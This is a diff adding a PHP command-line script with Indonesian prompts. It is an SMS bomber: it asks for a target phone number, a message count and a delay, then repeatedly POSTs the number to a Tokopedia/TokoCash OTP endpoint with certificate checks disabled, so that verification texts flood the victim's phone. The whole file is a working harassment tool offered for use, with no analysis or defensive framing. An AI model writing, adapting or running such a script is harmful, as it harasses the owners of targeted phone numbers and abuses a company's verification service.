@@ -1,0 +1,63 @@
+<?php
+# Ahmad Khoirul Marzuqin
+$n = "\e[0m"; # Normal
+# Ahmad Khoirul Marzuqin
+$c = "\e[90m"; # Coklat
+# Ahmad Khoirul Marzuqin
+$m = "\e[91m"; # Merah
+# Ahmad Khoirul Marzuqin
+$h = "\e[92m"; # Hijau
+# Ahmad Khoirul Marzuqin
+$k = "\e[93m"; # Kuning
+# Ahmad Khoirul Marzuqin
+$u = "\e[94m"; # Ungu
+# Ahmad Khoirul Marzuqin
+$p = "\e[95m"; # Pink
+# Ahmad Khoirul Marzuqin
+$b = "\e[96m"; # Biru
+# Ahmad Khoirul Marzuqin
+echo "$u             ╔════════════════════════╗
+             ║$k Sms      :$h Tokopedia$u   ║
+             ║$k Maksimal :$h 3 x Per Jam$u ║
+             ╚════════════════════════╝
+
+╔═╗
+║".$n."›".$u."║$k Nomor Target       :$h ";
+# Ahmad Khoirul Marzuqin
+$nomor = trim(fgets(STDIN));
+# Ahmad Khoirul Marzuqin
+echo $u."║".$n."›".$u."║$h Jumlah Pesan Sms   :$k ";
+# Ahmad Khoirul Marzuqin
+$jumlah = trim(fgets(STDIN));
+# Ahmad Khoirul Marzuqin
+echo $u."║".$n."›".$u."║$p Jeda Pesan Per Sms :$b ";
+# Ahmad Khoirul Marzuqin
+$jeda = trim(fgets(STDIN));
+# Ahmad Khoirul Marzuqin
+echo $u."║ ║\n";
+# Ahmad Khoirul Marzuqin
+for ($j=1; $j <= $jumlah; $j++) {
+$cp = "msisdn=$nomor&accept=";
+$cu = "https://www.tokocash.com/oauth/otp";
+$ci = curl_init();
+curl_setopt($ci, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ci, CURLOPT_HEADER, true);
+curl_setopt($ci, CURLOPT_POST, 1);
+curl_setopt($ci, CURLOPT_POSTFIELDS, $cp);
+curl_setopt($ci, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ci, CURLOPT_URL, $cu);
+sleep($jeda);
+$ce = curl_exec($ci);
+curl_close($ci);
+preg_match("/200000/", $ce, $kodece);
+if ($kodece[0] == "200000") {
+echo $u."║".$n."›".$u."║$p Mengirim Pesan Sms :$b $j$h ✓\r";
+}else{
+echo $u."║".$n."›".$u."║$m !!! Batas Maksimal$n Atau$m Koneksi Internet !!!\r";
+}
+}
+# Ahmad Khoirul Marzuqin
+echo "$u\n╚═╝\n";
+# Ahmad Khoirul Marzuqin
+?>
